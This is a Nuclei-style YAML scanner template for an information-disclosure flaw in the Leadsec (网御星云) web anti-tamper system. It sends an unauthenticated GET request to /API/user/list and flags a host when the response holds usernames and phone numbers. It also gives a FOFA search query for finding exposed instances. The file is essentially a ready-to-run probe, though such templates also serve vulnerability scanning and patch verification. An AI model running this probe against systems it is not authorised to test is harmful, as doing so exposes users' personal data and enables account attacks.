id: leadsec-inforguard-userlist-disclosure
info:
  name: 网御星云网页防篡改系统信息泄露
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://vip.bdziyi.com/59170/
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: title="网页防篡改系统"
    tips:
    repair:
    version:
  tags: leadsec,disclosure,inforguard

http:
  - raw:
      - |
        GET /API/user/list HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.2159.60 Safari/537.36
        Accept: */*
        Connection: close
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'username','phone_number')
        condition: and